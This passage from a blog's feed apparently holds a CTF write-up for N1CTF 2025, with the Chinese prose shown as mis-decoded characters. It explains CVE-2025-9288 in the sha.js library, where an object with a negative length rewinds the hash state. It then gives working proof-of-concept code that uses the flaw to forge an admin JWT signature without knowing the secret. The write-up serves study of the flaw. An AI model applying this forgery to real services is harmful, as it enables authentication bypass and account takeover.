href="https://github.com/browserify/sha.js/security/advisories/GHSA-95m3-7q98-8xr5">CVE-2025-9288</a></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">forgeHash</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">data<span class="token punctuation">,</span> payload</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">[</span>payload<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">length</span><span class="token operator">:</span> <span class="token operator">-</span>payload<span class="token punctuation">.</span>length<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token operator">...</span>data<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">const</span> sha <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'sha.js'</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> randomBytes <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token function-variable function">sha256</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>messages</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> hash <span class="token operator">=</span> <span class="token function">sha</span><span class="token punctuation">(</span><span class="token string">'sha256'</span><span class="token punctuation">)</span>  messages<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">m</span><span class="token punctuation">)</span> <span class="token operator">=></span> hash<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> hash<span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> validMessage <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token comment">// whatever</span><span class="token keyword">const</span> payload <span class="token operator">=</span> <span class="token function">forgeHash</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>validMessage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'Hashed input means safe'</span><span class="token punctuation">)</span><span class="token keyword">const</span> receivedMessage <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment">// e.g. over network, whatever</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">sha256</span><span class="token punctuation">(</span><span class="token operator">...</span>validMessage<span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">sha256</span><span class="token punctuation">(</span><span class="token operator">...</span>receivedMessage<span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>receivedMessage<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è·Ÿè¿›è¿™é‡Œçš„ hash.update è§‚å¯Ÿæ¼æ´çš„åŸç†</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">Hash</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">update</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">data<span class="token punctuation">,</span> enc</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> data <span class="token operator">===</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    enc <span class="token operator">=</span> enc <span class="token operator">||</span> <span class="token string">'utf8'</span>    data <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> enc<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">var</span> block <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_block  <span class="token keyword">var</span> blockSize <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_blockSize  <span class="token keyword">var</span> length <span class="token operator">=</span> data<span class="token punctuation">.</span>length  <span class="token keyword">var</span> accum <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_len  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> offset <span class="token operator">&lt;</span> length<span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> assigned <span class="token operator">=</span> accum <span class="token operator">%</span> blockSize    <span class="token keyword">var</span> remainder <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>length <span class="token operator">-</span> offset<span class="token punctuation">,</span> blockSize <span class="token operator">-</span> assigned<span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> remainder<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      block<span class="token punctuation">[</span>assigned <span class="token operator">+</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">[</span>offset <span class="token operator">+</span> i<span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span>    accum <span class="token operator">+=</span> remainder    offset <span class="token operator">+=</span> remainder    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>accum <span class="token operator">%</span> blockSize<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_update</span><span class="token punctuation">(</span>block<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>_len <span class="token operator">+=</span> length  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è°ƒè¯•ä¸€ä¸‹å¯ä»¥å‘ç°ï¼ŒvalidMessage è¿™é‡Œæ˜¯ä¸‰ç»„ 32 é•¿åº¦çš„ bufferï¼Œè€Œ receivedMessage è¿™é‡Œç¬¬ä¸€ç»„æ˜¯æˆ‘ä»¬æ’å…¥çš„å­—ç¬¦ä¸²ï¼Œç¬¬äºŒç»„æ˜¯ lengthï¼Œå€¼ä¸ºå‰é¢å­—ç¬¦ä¸²é•¿åº¦çš„è´Ÿæ•°ï¼Œç¬¬ä¸‰ç»„åˆ™æ˜¯è¿åœ¨ä¸€èµ·çš„ validMessage é•¿åº¦ä¸º 96</p><p>è€Œè¿™æ ·åšåœ¨ç»è¿‡ <code>messages.forEach((m) =&gt; hash.update(m))</code> åä¼šä½¿å¾—å®é™…è¿›è¡Œ sha256 è®¡ç®—çš„ä»ä¸ºåé¢ 96 é•¿åº¦çš„ buffer</p><p>æ€»ç»“ä¸€ä¸‹å°±æ˜¯åœ¨åŠ å¯†ä½“é‡Œæ’å…¥ä¸€ä¸ªæ–°çš„éƒ¨åˆ†å¹¶æ’å…¥ <code>&#123;length: -x&#125;</code>ï¼Œä¼šä½¿å¾— hash å›æ»šï¼Œä¸ä¹‹å‰æœªæ’å…¥è®¡ç®—çš„ hash å€¼ä¸€æ ·</p><p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦è®¡ç®—æ–°æ’å…¥çš„æ€» length ä¸º 0 å³å¯åˆ©ç”¨è¿™ä¸ªæ¼æ´</p><p>è§‚å¯Ÿ sha256 åœ¨é¢˜ç›®ä¸­çš„è¿ç”¨ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">signJWT</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">payload<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> expiresIn <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> secret <span class="token operator">=</span> <span class="token constant">JWT_SECRET</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> header <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">alg</span><span class="token operator">:</span> <span class="token string">'HS256'</span><span class="token punctuation">,</span> <span class="token literal-property property">typ</span><span class="token operator">:</span> <span class="token string">'JWT'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> now <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">const</span> body <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token operator">...</span>payload<span class="token punctuation">,</span> <span class="token literal-property property">length</span><span class="token operator">:</span>payload<span class="token punctuation">.</span>username<span class="token punctuation">.</span>length<span class="token punctuation">,</span><span class="token literal-property property">iat</span><span class="token operator">:</span> now <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>expiresIn<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        body<span class="token punctuation">.</span>exp <span class="token operator">=</span> now <span class="token operator">+</span> expiresIn<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span>        <span class="token function">toBase64Url</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token function">toBase64Url</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token function">sha256</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">[</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span><span class="token punctuation">,</span> body<span class="token punctuation">,</span> secret<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">verifyJWT</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">token<span class="token punctuation">,</span> secret <span class="token operator">=</span> <span class="token constant">JWT_SECRET</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> token <span class="token operator">!==</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> parts <span class="token operator">=</span> token<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>parts<span class="token punctuation">.</span>length <span class="token operator">!==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> <span class="token punctuation">[</span>encodedHeader<span class="token punctuation">,</span> encodedPayload<span class="token punctuation">,</span> signature<span class="token punctuation">]</span> <span class="token operator">=</span> parts<span class="token punctuation">;</span>    <span class="token keyword">let</span> header<span class="token punctuation">;</span>    <span class="token keyword">let</span> payload<span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        header <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token function">fromBase64Url</span><span class="token punctuation">(</span>encodedHeader<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        payload <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token function">fromBase64Url</span><span class="token punctuation">(</span>encodedPayload<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> expectedSignatureHex <span class="token operator">=</span> <span class="token function">sha256</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">[</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span><span class="token punctuation">,</span> payload<span class="token punctuation">,</span> secret<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> providedSignature<span class="token punctuation">;</span>    <span class="token keyword">let</span> expectedSignature<span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        providedSignature <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>signature<span class="token punctuation">,</span> <span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        expectedSignature <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>expectedSignatureHex<span class="token punctuation">,</span> <span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>        providedSignature<span class="token punctuation">.</span>length <span class="token operator">!==</span> expectedSignature<span class="token punctuation">.</span>length <span class="token operator">||</span>        <span class="token operator">!</span>crypto<span class="token punctuation">.</span><span class="token function">timingSafeEqual</span><span class="token punctuation">(</span>providedSignature<span class="token punctuation">,</span> expectedSignature<span class="token punctuation">)</span>    <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>header<span class="token punctuation">.</span>alg <span class="token operator">!==</span> <span class="token string">'HS256'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>payload<span class="token punctuation">.</span>exp <span class="token operator">&amp;&amp;</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">1000</span><span class="token punctuation">)</span> <span class="token operator">>=</span> payload<span class="token punctuation">.</span>exp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> payload<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>signJWT ä¸­ï¼Œbody çš„ç»„æˆæ˜¯ <code>&#123; ...payload, length:payload.username.length,iat: now &#125;</code>ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹ sha256 sign éƒ¨åˆ† body é‡Œçš„ length æ¥åˆ©ç”¨æ¼æ´</p><p>è€Œ verifyJWT ä¸­æœŸæœ›çš„ sign æ˜¯ <code>sha256(...[JSON.stringify(header), body, secret])</code>ï¼Œæˆ‘ä»¬åœ¨æœªçŸ¥ secret çš„æƒ…å†µä¸‹ï¼Œè¦æ„é€  sha256 ä¸å‰è€…ç›¸ç­‰å°±éœ€è¦æŠŠ secret çš„é•¿åº¦ä¸€åŒè¦†ç›–æ‰ï¼Œå³æœ€ç»ˆçš„æ€»é•¿åº¦ä¸º 0</p><p>ç¼–å†™ pocï¼Œéœ€è¦ä¿®æ”¹ body éƒ¨åˆ†çš„ lengthï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> sha <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'sha.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">sha256</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>messages</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> hash <span class="token operator">=</span> <span class="token function">sha</span><span class="token punctuation">(</span><span class="token string">'sha256'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    messages<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">m</span><span class="token punctuation">)</span> <span class="token operator">=></span> hash<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> hash<span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> verifyJWT <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./auth'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">toBase64Url</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">input</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> buffer <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">isBuffer</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">?</span> input <span class="token operator">:</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> buffer        <span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\+</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\/</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">=+$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">const</span> mysecret <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token keyword">const</span> header <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">alg</span><span class="token operator">:</span> <span class="token string">'HS256'</span><span class="token punctuation">,</span> <span class="token literal-property property">typ</span><span class="token operator">:</span> <span class="token string">'JWT'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">const</span> len <span class="token operator">=</span> <span class="token operator">-</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token operator">+</span> mysecret<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">signJWT</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">payload<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> expiresIn <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> secret <span class="token operator">=</span> mysecret</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> header <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">alg</span><span class="token operator">:</span> <span class="token string">'HS256'</span><span class="token punctuation">,</span> <span class="token literal-property property">typ</span><span class="token operator">:</span> <span class="token string">'JWT'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> now <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token keyword">const</span> body <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token operator">...</span>payload<span class="token punctuation">,</span> <span class="token literal-property property">length</span><span class="token operator">:</span> len<span class="token punctuation">,</span> <span class="token literal-property property">iat</span><span class="token operator">:</span> now <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>expiresIn<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    body<span class="token punctuation">.</span>exp <span class="token operator">=</span> now <span class="token operator">+</span> expiresIn<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token punctuation">[</span>    <span class="token function">toBase64Url</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">toBase64Url</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">sha256</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">[</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span><span class="token punctuation">,</span> body<span class="token punctuation">,</span> secret<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>token <span class="token operator">=</span> <span class="token function">signJWT</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">username</span><span class="token operator">:</span> <span class="token string">"admin"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> mysecret<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">verifyJWT</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> mysecret<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/11/02/N1CTF-2025/IMG-20251115013530721.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;æ‰“ä¸€åŠå€¦äº†ï¼Œæ²¡ç²¾åŠ›æ‰“åªèƒ½åé¢å¤ç°ä¸‹é¢˜ç›®&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://gsbp0.github.io/post/2025n1ctf-wp-for-n1cateezzjs/&quot;&gt;https://gsbp0.github.io/post/2025n1ctf-wp-for-n1cateezzjs/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>æ˜¥ç§‹äº‘å¢ƒ æ— é—´è®¡åˆ’ï¼ˆæœªå®Œæˆï¼‰</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/10/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-%E6%97%A0%E9%97%B4%E8%AE%A1%E5%88%92/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/10/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-%E6%97%A0%E9%97%B4%E8%AE%A1%E5%88%92/</id>
    <published>2025-10-24T05:01:33.000Z</published>
    <updated>2025-12-15T08:08:41.227Z</updated>
    
